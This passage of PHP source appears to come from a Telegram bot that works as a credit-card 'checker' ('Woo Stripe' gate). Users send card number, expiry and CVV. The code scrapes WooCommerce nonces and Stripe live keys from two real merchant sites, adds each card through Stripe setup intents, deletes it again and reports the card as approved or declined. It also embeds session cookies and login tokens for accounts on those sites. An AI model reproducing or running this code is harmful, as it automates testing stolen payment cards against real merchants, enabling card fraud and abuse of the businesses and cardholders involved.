sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=e8840e00-a679-4d73-8457-4388262e24a5a397d3; __stripe_sid=aec8464c-ef94-48a8-baa4-952f5c4f15f6b142ae; wordpress_logged_in_3efb2a5bb3559a2902dbffae45726d30=Rigo%20Lopez%7C1735501274%7CurxsLaoCkzeiZFLcKow3sfim63XiB9qRWQ4iSJosGTB%7Cb687215ea8543185629b3a86b2d8c90ecf663779dd5aef422d0930b53cee0454; wfwaf-authcookie-91172c47aa3700744a7ba5a826d5c151=2594%7Cother%7Cread%7Cf05fe5457117c7f43aedd2bdf4efb34bfed800301389cb5bd3ff347098c13c5b; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'cache-control: max-age=0',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.8',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-dest: document',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'referer: https://www.hollywoodexpendables.com/my-account/add-payment-method/',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
preg_match($patron, $response, $coincidencias);
$url_nonce = $coincidencias[0];
curl_close($curl);

echo "$url_nonce\n";



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.hollywoodexpendables.com/my-account/delete-payment-method'.$url_nonce.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=e8840e00-a679-4d73-8457-4388262e24a5a397d3; __stripe_sid=aec8464c-ef94-48a8-baa4-952f5c4f15f6b142ae; wordpress_logged_in_3efb2a5bb3559a2902dbffae45726d30=Rigo%20Lopez%7C1735501274%7CurxsLaoCkzeiZFLcKow3sfim63XiB9qRWQ4iSJosGTB%7Cb687215ea8543185629b3a86b2d8c90ecf663779dd5aef422d0930b53cee0454; wfwaf-authcookie-91172c47aa3700744a7ba5a826d5c151=2594%7Cother%7Cread%7Cf05fe5457117c7f43aedd2bdf4efb34bfed800301389cb5bd3ff347098c13c5b; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.8',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'referer: https://www.hollywoodexpendables.com/my-account/payment-methods/',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

} elseif ($success === true && $status === "requires_action") {
    $respo = "3DS Authenticate Rejected ❌";
} else {
    $respo = $message;
}



$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";



if (empty($respo)) {
        $respo = $response;
}

if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Woo Stripe\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Woo Stripe\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Woo Stripe\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Gate Error❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}


if ($live) {
    editMessage($chat_id, $respuesta, $id_text);
} else {
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}
	

elseif((strpos($message, "!ho") === 0)||(strpos($message, "/ho") === 0)||(strpos($message, ".ho") === 0)){
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
//$ano   = $i[2];
$ano  = trim(substr($i[2], -2));
$cvv   = $i[3];

$bin = substr($lista, 0, 6);
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//


//Verifi//
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /ho CC|MM|YYYY|CVV\n";
    sendMessage($chat_id, $respuesta, $message_id);
    die();
}



//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//

$longitud = 4;
$partes = [];
for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
}
	
$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

////EXTRAE EL NONCE////
$cc = implode('+', $partes);
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hoamemberservices.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=9a113a5b-c798-4adf-b369-5d104171714f59ffb5; et_bloom_optin_optin_3_8f64235d7c_imp=true; mailchimp_user_previous_email=xipay59414%40bulatox.com; mailchimp_user_email=xipay59414%40bulatox.com; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=xipay59414%40bulatox.com%7C1736039379%7CRwmDx6j241K3cZhYxMsvwCW95Ml1lU48Dw0zOlP3elO%7C6b75b3ae5b6484b5ff5f0b6210a4b16bf2e67be21d091427d6436a34c746aab7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; __stripe_sid=d590daae-403c-4e5c-8075-6c45d252a142c31711; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'Referer: https://hoamemberservices.com/my-account/payment-methods/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/createAndConfirmSetupIntentNonce":"([a-zA-Z0-9]+)"/';
preg_match($patron, $response, $coincidencias);
$nonce = $coincidencias[1];
/////
$patron = '/pk_live_[a-zA-Z0-9]*/';
preg_match($patron, $response, $coincidencia);
$pk_live = $coincidencia[0];
curl_close($curl);

/////EXTRAE EL ID//

echo "$nonce\n";
echo "$pk_live\n";



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10080&billing_details%5Baddress%5D%5Bcountry%5D=US&pasted_fields=number&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhoamemberservices.com&time_on_page=143374&client_attribution_metadata%5Bclient_session_id%5D=39977717-a330-49ea-8bda-8bfad4e083e1&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=0b04b48f-276d-4e18-b076-a9831c4f42edfac586&muid=9a113a5b-c798-4adf-b369-5d104171714f59ffb5&sid=d590daae-403c-4e5c-8075-6c45d252a142c31711&key=pk_live_519doZ4BaFP2UgItppWUDvN6lMzRQOWdAmkEmFW85zYxVwikxsEfCWrZayA4AzRxOPhPx0Ne1yRoppgSGnXehspOX005uDYXtP9&_stripe_version=2024-06-20',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.7',
    'origin: https://js.stripe.com',
    'sec-fetch-site: same-site',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://js.stripe.com/',
    'priority: u=1, i',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
curl_close($curl);
echo "$id\n";
////HACE EL AUTH///


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hoamemberservices.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=9a113a5b-c798-4adf-b369-5d104171714f59ffb5; et_bloom_optin_optin_3_8f64235d7c_imp=true; mailchimp_user_previous_email=xipay59414%40bulatox.com; mailchimp_user_email=xipay59414%40bulatox.com; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=xipay59414%40bulatox.com%7C1736039379%7CRwmDx6j241K3cZhYxMsvwCW95Ml1lU48Dw0zOlP3elO%7C6b75b3ae5b6484b5ff5f0b6210a4b16bf2e67be21d091427d6436a34c746aab7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_sid=d590daae-403c-4e5c-8075-6c45d252a142c31711',
//  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
//  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'X-Requested-With: XMLHttpRequest',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'sec-ch-ua-mobile: ?1',
    'Sec-GPC: 1',
    'Accept-Language: es-US,es;q=0.7',
    'Origin: https://hoamemberservices.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://hoamemberservices.com/my-account/add-payment-method/',
  ],
]);
	
$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
//------------------------------------------//
//$message = $json['data']['error']['message'];
$message = str_replace("Error: ", "", $json['data']['error']['message']);
$success = $json['success'];
$status = $json['data']['status'];
curl_close($curl);

if ($success === true && $status === "succeeded") {
    $respo = "1000: Approved";


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hoamemberservices.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=9a113a5b-c798-4adf-b369-5d104171714f59ffb5; et_bloom_optin_optin_3_8f64235d7c_imp=true; mailchimp_user_previous_email=xipay59414%40bulatox.com; mailchimp_user_email=xipay59414%40bulatox.com; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=xipay59414%40bulatox.com%7C1736039379%7CRwmDx6j241K3cZhYxMsvwCW95Ml1lU48Dw0zOlP3elO%7C6b75b3ae5b6484b5ff5f0b6210a4b16bf2e67be21d091427d6436a34c746aab7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_sid=d590daae-403c-4e5c-8075-6c45d252a142c31711',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Cache-Control: max-age=0',
    'Upgrade-Insecure-Requests: 1',
    'Sec-GPC: 1',
    'Accept-Language: es-US,es;q=0.7',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Dest: document',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'Referer: https://hoamemberservices.com/my-account/add-payment-method/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
preg_match($patron, $response, $coincidencias);
$url_nonce = $coincidencias[0];
curl_close($curl);

echo "$url_nonce\n";


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hoamemberservices.com/my-account/delete-payment-method'.$url_nonce.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=9a113a5b-c798-4adf-b369-5d104171714f59ffb5; et_bloom_optin_optin_3_8f64235d7c_imp=true; mailchimp_user_previous_email=xipay59414%40bulatox.com; mailchimp_user_email=xipay59414%40bulatox.com; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=xipay59414%40bulatox.com%7C1736039379%7CRwmDx6j241K3cZhYxMsvwCW95Ml1lU48Dw0zOlP3elO%7C6b75b3ae5b6484b5ff5f0b6210a4b16bf2e67be21d091427d6436a34c746aab7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; __stripe_sid=d590daae-403c-4e5c-8075-6c45d252a142c31711; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'Upgrade-Insecure-Requests: 1',
    'Sec-GPC: 1',
    'Accept-Language: es-US,es;q=0.7',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-User: ?1',
    'Sec-Fetch-Dest: document',
    'Referer: https://hoamemberservices.com/my-account/payment-methods/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

} elseif ($success === true && $status === "requires_action") {
    $respo = "3DS Authenticate Rejected ❌";
} else {
    $respo = $message;
}



$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";



if (empty($respo)) {
        $respo = $response;
}



if (array_in_string($respo, $live_array)) {
